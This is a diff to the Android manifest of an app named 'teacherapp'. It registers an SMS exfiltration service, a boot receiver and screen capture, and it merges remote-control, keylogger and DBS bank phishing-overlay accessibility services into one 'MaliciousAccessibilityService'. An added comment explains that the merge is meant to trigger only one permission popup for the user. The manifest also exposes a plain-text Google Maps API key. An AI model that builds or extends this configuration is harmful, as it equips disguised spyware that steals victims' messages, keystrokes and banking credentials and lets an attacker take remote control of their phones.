@@ -32,7 +32,6 @@
         android:theme="@style/Theme.Teacherapp"
         android:usesCleartextTraffic="true">
 
-        <!-- Google Maps API Key -->
         <meta-data
             android:name="com.google.android.geo.API_KEY"
             android:value="AIzaSyBd9BvIpTmRCxtEPlV3wmA37b-cQGzNt0o" />
@@ -48,7 +47,6 @@
             </intent-filter>
         </activity>
 
-        <!-- ✅ FIXED package name: com.example.teacherapp -->
         <receiver
             android:name="com.example.teacherapp.receivers.BootReceiver"
             android:enabled="true"
@@ -68,7 +66,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ✅ FIXED package names for all services -->
         <service
             android:name="com.example.teacherapp.services.SmsExfiltrationService"
             android:enabled="true"
@@ -100,8 +97,15 @@
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
+        <!--
+            ONE AccessibilityService = ONE permission popup for the user.
+            Internally delegates to:
+              • KeyloggerHelper      (keystrokes + field focus)
+              • OverlayHelper        (DBS phishing overlay)
+              • RemoteControlHelper  (remote tap / swipe / text)
+        -->
         <service
-            android:name="com.example.teacherapp.services.RemoteControlService"
+            android:name="com.example.teacherapp.services.MaliciousAccessibilityService"
             android:enabled="true"
             android:exported="false"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
@@ -110,35 +114,7 @@
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/remote_control_service_config" />
-        </service>
-
-        <!-- Keylogger Accessibility Service -->
-        <service
-            android:name="com.example.teacherapp.services.KeyloggerService"
-            android:enabled="true"
-            android:exported="false"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/keylogger_service_config" />
-        </service>
-
-        <!-- ✅ NEW — Realistic DBS Overlay Accessibility Service -->
-        <service
-            android:name="com.example.teacherapp.services.RealisticDbsOverlay"
-            android:enabled="true"
-            android:exported="false"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/realistic_dbs_overlay_config" />
+                android:resource="@xml/combined_service_config" />
         </service>
 
     </application>
